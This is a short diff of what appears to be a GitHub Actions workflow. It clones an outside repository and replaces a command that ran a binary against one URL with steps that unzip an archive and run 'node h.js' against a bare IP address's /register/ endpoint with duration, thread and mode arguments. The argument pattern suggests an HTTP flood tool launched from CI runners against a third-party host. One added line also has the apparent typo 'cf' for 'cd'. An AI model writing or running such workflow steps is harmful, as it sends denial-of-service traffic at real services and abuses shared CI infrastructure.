@@ -34,7 +34,9 @@ jobs:
           pip install requests
           git clone https://github.com/Fegp1p2/ideal-guide.git
           chmod +x ki
-          ./ki https://load.vmheaven.io/ 200 1 1
+          unzip Fc-main.zip 
+          cf Fc-main
+          node h.js http://95.179.246.130/register/ 800 4 h1
 
           
 
